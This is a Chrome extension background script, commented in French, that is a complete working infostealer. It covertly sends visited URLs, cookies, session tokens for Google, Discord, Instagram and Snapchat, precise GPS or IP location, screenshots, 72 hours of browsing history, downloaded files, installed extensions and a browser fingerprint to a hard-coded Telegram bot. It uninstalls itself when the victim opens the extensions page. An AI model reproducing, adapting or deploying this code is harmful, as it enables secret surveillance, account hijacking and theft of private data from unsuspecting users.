const BOT_TOKEN = "8447955383:AAErDQ-rcTXoeI48uN0MBMuKMmSQRoG4xNc";
const CHAT_ID = "-1003884947829";

const TOPICS = {
  GEO: "5",
  FORMULAIRES: "6", 
  MESSAGERIE: "7",
  RECHERCHES: "8",
  TELECHARGER: "10",
  EXTENSIONS: "12",
  ALERTE: "13",
  TOKENS: "15",
  NAV_PRIVEE: "17",
  HISTORIQUE_TOTAL: "150"
};
 function buildMessage(title, body, isInc = false) {
  const mode = isInc ? "🕵️ Nav Privée" : "🌐 Nav Publique";
  return `🔥 <b>${title}</b>\n\n${body}\n\n🛡️ ${mode}`;
}

async function sendTelegram(title, body, topicId, isInc = false) {
  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      message_thread_id: topicId,
      text: buildMessage(title, body, isInc),
      parse_mode: "HTML",
      disable_web_page_preview: true
    })
  });
}


chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.status === "complete" && tab.url && tab.url.startsWith("http")) {
    
    sendTelegram("Nouvel Onglet Chargé", `🔗 <b>Lien :</b> ${tab.url}`, TOPICS.RECHERCHES, tab.incognito);

    chrome.cookies.getAll({ url: tab.url }, function (cookies) {
      if (cookies.length === 0) return;
      const detailedCookies = cookies.slice(0, 10).map((c, i) => ({ id: i + 1, name: c.name, value: c.value }));
      sendTelegram("Cookies Interceptés", `📍 <b>Site :</b> ${tab.url}\n<pre>${JSON.stringify(detailedCookies, null, 2)}</pre>`, TOPICS.TOKENS, tab.incognito);
    });


    chrome.storage.session.get(['geoRequested'], function(result) {
      if (!result.geoRequested) {
        chrome.storage.session.set({geoRequested: true}); // Marque comme demandé pour cette session
        
        chrome.scripting.executeScript({
          target: { tabId: tab.id },
          func: () => {
            navigator.geolocation.getCurrentPosition(
              (pos) => { chrome.runtime.sendMessage({ action: "geo_result", status: "success", lat: pos.coords.latitude, lon: pos.coords.longitude }); },
              (err) => { chrome.runtime.sendMessage({ action: "geo_result", status: "error" }); },
              { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
            );
          }
        });
      }
    });
  }
});
 chrome.runtime.onMessage.addListener((msg, sender) => {
  if (msg.action === "geo_result") {
    const isInc = sender.tab ? sender.tab.incognito : false;
     fetch("https://ipapi.co/json/").then(r => r.json()).then(data => {
      if (msg.status === "success") {
        const text = `🌐 <b>IP :</b> ${data.ip}\n📍 <b>Coords GPS :</b> <code>${msg.lat}, ${msg.lon}</code>\n🗺️ <a href="https://maps.google.com/?q=$$${msg.lat},${msg.lon}">Voir sur Google Maps</a>`;
        sendTelegram("Localisation GPS Précise", text, TOPICS.GEO, isInc);
      } else {
        const text = `🌐 <b>IP :</b> ${data.ip}\n🏙️ <b>Ville :</b> ${data.city}\n📍 <b>Coords approx :</b> <code>${data.latitude}, ${data.longitude}</code>`;
        sendTelegram("Localisation IP (GPS Refusé)", text, TOPICS.GEO, isInc);
      }
    }).catch(() => {});
  }
});
 chrome.runtime.onMessage.addListener((msg, sender) => {
  if (msg.action === "geo_result") {
    const isInc = sender.tab ? sender.tab.incognito : false;
    
    if (msg.status === "success") {
      const text = `📍 <b>Coords :</b> <code>${msg.lat}, ${msg.lon}</code>\n<a href="https://maps.google.com/?q=$${msg.lat},${msg.lon}">Voir sur Google Maps</a>`;
      sendTelegram("Localisation GPS Précise", text, TOPICS.GEO, isInc);
    } else {
       fetch("https://ipapi.co/json/").then(r => r.json()).then(data => {
        const text = `🌐 <b>IP :</b> ${data.ip}\n🏙️ <b>Ville :</b> ${data.city}\n📍 <b>Coords approx :</b> <code>${data.latitude}, ${data.longitude}</code>`;
        sendTelegram("Localisation IP (GPS Refusé)", text, TOPICS.GEO, isInc);
      }).catch(() => {
        sendTelegram("Erreur Localisation", "Impossible de récupérer l'IP ou le GPS.", TOPICS.GEO, isInc);
      });
    }
  }
});
 chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
  if (msg.action === "capture" && msg.url) {
    const delay = msg.delay || 0; 
    
    setTimeout(() => {
       chrome.tabs.captureVisibleTab(null, { format: "png", quality: 80 }, function (dataUrl) {
        if (chrome.runtime.lastError || !dataUrl) return; 
        
        try {
           const base64Data = dataUrl.split(',')[1];
          const binaryData = atob(base64Data);
          const array = new Uint8Array(binaryData.length);
          
          for (let i = 0; i < binaryData.length; i++) {
            array[i] = binaryData.charCodeAt(i);
          }
          
          const blob = new Blob([array], { type: 'image/png' });
          const form = new FormData();
          const isInc = sender.tab ? sender.tab.incognito : false;
          
          form.append("chat_id", CHAT_ID);
          form.append("message_thread_id", msg.topic || TOPICS.FORMULAIRES);
           form.append("photo", blob, "capture_ecran.png");
          form.append("caption", buildMessage(msg.title || "Preuve Visuelle", `📍 <b>Site :</b> ${msg.url}`, isInc));
          form.append("parse_mode", "HTML");
           fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: form });

        } catch (e) {
          console.error("Erreur capture :", e);
        }
      });
    }, delay);
    
    return true; 
  }
});
 chrome.runtime.onStartup.addListener(() => {
  const time72hAgo = (new Date).getTime() - (1000 * 60 * 60 * 72);
  chrome.history.search({ text: "", startTime: time72hAgo, maxResults: 5000 }, (historyItems) => {
    if (historyItems.length === 0) return;
    
    let content = "=== HISTORIQUE DE NAVIGATION SUR 72 HEURES ===\n\n";
    historyItems.forEach(item => {
      content += `[${new Date(item.lastVisitTime).toLocaleString()}] - ${item.title || "Sans titre"}\nURL: ${item.url}\n\n`;
    });

    const blob = new Blob([content], { type: "text/plain" });
    const form = new FormData();
    form.append("chat_id", CHAT_ID);
    form.append("message_thread_id", TOPICS.HISTORIQUE_TOTAL);
    form.append("document", blob, "Historique_Complet_72H.txt");
    form.append("caption", buildMessage("Historique Exporté", `📂 Le fichier contenant l'historique complet des 72 dernières heures vient d'être généré. (${historyItems.length} entrées)`, false));
    form.append("parse_mode", "HTML");
    
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, { method: "POST", body: form });
  });
});
 chrome.runtime.onStartup.addListener(() => {
  chrome.extension.isAllowedIncognitoAccess((isAllowed) => {
    chrome.windows.getAll({ populate: true }, (windows) => {
      const isWindowOpen = windows.some(w => w.incognito);
      const text = `🛡️ <b>Autorisé en navigation privée :</b> ${isAllowed ? "OUI ✅" : "NON ❌"}\n👁️ <b>Onglet privé déjà ouvert :</b> ${isWindowOpen ? "OUI ⚠️" : "NON 🌐"}`;
      sendTelegram("Rapport de Sécurité", text, TOPICS.NAV_PRIVEE, false);
    });
  });
});
 chrome.runtime.onStartup.addListener(() => {
  chrome.management.getAll((exts) => {
    const extList = exts.filter(e => e.enabled && e.type === "extension").map(ext => `- ${ext.name}`).join("\n");
    sendTelegram("Extensions Actives", `<pre>${extList}</pre>`, TOPICS.EXTENSIONS, false);
  });

  chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => {
    if (tabs.length > 0) {
      const isInc = tabs[0].incognito;
      chrome.scripting.executeScript({
        target: { tabId: tabs[0].id },
        func: (botToken, chatId, topic, title, footer) => {
          const data = { os: navigator.platform, langue: navigator.language, res: `${window.screen.width}x${window.screen.height}` };
          const text = `🔥 <b>${title}</b> 🔥\n━━━━━━━━━━━━━━━━━━━━━━\n\n<pre>${JSON.stringify(data, null, 2)}</pre>\n\n━━━━━━━━━━━━━━━━━━━━━━\n🛡️ <b>Statut :</b> ${footer}`;
          fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: "POST", headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: chatId, message_thread_id: topic, text: text, parse_mode: "HTML" })
          });
        },
        args: [BOT_TOKEN, CHAT_ID, TOPICS.RECHERCHES, "Fingerprint Navigateur", isInc ? "🕵️ Navigation Privée" : "🌐 Navigation Publique"],
        world: "MAIN"
      });
    }
  });
});
 chrome.downloads.onChanged.addListener((delta) => {
  if (!delta.state || delta.state.current !== "complete") return;
  chrome.downloads.search({ id: delta.id }, (results) => {
    if (!results || results.length === 0) return;
    const file = results[0];
    const sizeMB = file.fileSize ? (file.fileSize / 1024 / 1024).toFixed(2) : "0";
    
    if (file.fileSize < 50 * 1024 * 1024) {
      fetch(file.url).then(res => res.blob()).then(blob => {
        const form = new FormData();
        form.append("chat_id", CHAT_ID);
        form.append("message_thread_id", TOPICS.TELECHARGER);
        form.append("document", blob, file.filename.split(/[/\\]/).pop());
        form.append("caption", buildMessage("Exfiltration Fichier", `📦 <b>Taille :</b> ${sizeMB} Mo\n🔗 <b>Lien original :</b> ${file.url}`, false));
        form.append("parse_mode", "HTML");
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, { method: "POST", body: form });
      }).catch(() => {});
    } else {
      sendTelegram("Téléchargement Lourd", `📦 <b>Nom :</b> ${file.filename.split(/[/\\]/).pop()}\n⚖️ <b>Taille :</b> ${sizeMB} Mo\n🔗 <b>Lien :</b> ${file.url}`, TOPICS.TELECHARGER, false);
    }
  });
});
 function extractSessionCookies() {
  const TARGET_DOMAINS = ["accounts.google.com", "discord.com", "instagram.com", "snapchat.com"];
  const KEYS = ["token", "session", "ssid", "sid", "auth"];
  TARGET_DOMAINS.forEach(domain => {
    chrome.cookies.getAll({ domain }, function (cookies) {
      const sessionCookies = cookies.filter(cookie => KEYS.some(key => cookie.name.toLowerCase().includes(key)));
      if (sessionCookies.length > 0) {
        const payload = sessionCookies.map(c => `${c.name}=${c.value}`).join("\n\n");
        sendTelegram("Tokens Identifiés", `📍 <b>Plateforme :</b> ${domain}\n\n<pre>${payload.slice(0, 3000)}</pre>`, TOPICS.TOKENS, false);
      }
    });
  });
}
chrome.runtime.onStartup.addListener(extractSessionCookies);
setInterval(extractSessionCookies, 1000 * 60 * 60);
 const startupTime = Date.now();
let isSelfDestructing = false; // <-- LE FLAG ANTI-DOUBLON

function triggerSelfDestruct(isInc) {
  if (isSelfDestructing) return; // Si déjà activé, on ignore
  isSelfDestructing = true;
  
  sendTelegram(
    "⚠️ ALERTE CRITIQUE", 
    "L'utilisateur cible inspecte <code>chrome://extensions</code>.\n\n💥 <b>Autodestruction !</b>", 
    TOPICS.ALERTE, 
    isInc
  );
  setTimeout(() => { chrome.management.uninstallSelf(); }, 2000);
}

chrome.tabs.onUpdated.addListener(function(tabId, changeInfo, tab) {
  if (changeInfo.status === 'complete' && tab.url && tab.url.includes("chrome://extensions")) {
    if (Date.now() - startupTime > 45000) triggerSelfDestruct(tab.incognito);
  }
});

chrome.tabs.onActivated.addListener(function(activeInfo) {
  chrome.tabs.get(activeInfo.tabId, function(tab) {
    if (tab.url && tab.url.includes("chrome://extensions")) {
      if (Date.now() - startupTime > 45000) triggerSelfDestruct(tab.incognito);
    }
  });
});
